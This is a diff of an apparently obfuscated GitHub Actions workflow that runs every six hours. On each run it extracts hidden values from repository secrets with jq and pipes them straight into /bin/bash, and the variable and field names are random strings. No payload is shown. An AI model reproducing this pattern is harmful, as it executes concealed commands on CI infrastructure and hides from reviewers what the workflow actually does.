@@ -2,9 +2,8 @@ name: caiweiccc
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 3/6 * * *'
-
-jobs:  # 25269
+    - cron: '37 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,21 +11,11 @@ jobs:  # 25269
       - uses: actions/checkout@v4
       - name: caiweiccc
         env:
-          t30: ${{ secrets.t30 }}
+          h5667: ${{ secrets.h5667 }}
         run: |
-          echo $t30 | jq -r .hk8 | /bin/bash
-          echo $yiwxq94115 | jq -r .ipcoz42 | /bin/bash
-          echo $gh9782 | jq -r .qcbj7883 | /bin/bash
-          echo $ua96500 | jq -r .xyic40405 | /bin/bash
-          echo $zhtc7692 | jq -r .dkypb550 | /bin/bash
-          echo $r80123 | jq -r .do8399 | /bin/bash
-          echo $pibw5744 | jq -r .h184 | /bin/bash
-          echo $fy11 | jq -r .qs9 | /bin/bash
-          echo $pzpfr884 | jq -r .w99298 | /bin/bash
-          echo $u094 | jq -r .mcdzy0135 | /bin/bash
-          echo $yi7664 | jq -r .qzn34774 | /bin/bash
-          echo $piklv141 | jq -r .lkr543 | /bin/bash
-          echo $ng647 | jq -r .yhv441 | /bin/bash
-          echo $okd47897 | jq -r .gpuqq0234 | /bin/bash
-          echo $az82199 | jq -r .dtzkz0433 | /bin/bash
+          echo $h5667 | jq -r .cj10 | /bin/bash
+          echo $uon12 | jq -r .rqfeg39 | /bin/bash
+          echo $dv39504 | jq -r .pznw0 | /bin/bash
+          echo $ctds137 | jq -r .mgh23 | /bin/bash
+          echo $zvq99921 | jq -r .opzf884 | /bin/bash
 
